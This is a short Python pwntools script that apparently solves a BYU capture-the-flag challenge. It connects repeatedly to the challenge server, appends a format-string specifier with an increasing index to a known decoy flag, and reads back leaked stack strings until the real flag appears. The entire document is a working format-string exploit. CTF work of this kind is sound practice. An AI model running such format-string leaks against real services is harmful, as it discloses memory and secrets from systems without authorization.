from pwn import *

# Set context
context.arch = 'amd64'

def leak_all_strings():
    for i in range(1, 100):
        r = remote('chals.cyberjousting.com', 1367)
        payload = f'byuctf{{welcome_to_rev_fellas}}|%{i}$s'.encode()
        r.sendlineafter(b'?', payload)
        try:
            r.recvuntil(b'Correct! The flag is ')
            line = r.recvline()
            # print(f"Index {i}: {line}")
            if b'byuctf{' in line and b'welcome_to_rev_fellas' not in line:
                print(f"FOUND REAL FLAG at Index {i}: {line}")
                r.close()
                return
        except:
            pass
        r.close()

leak_all_strings()
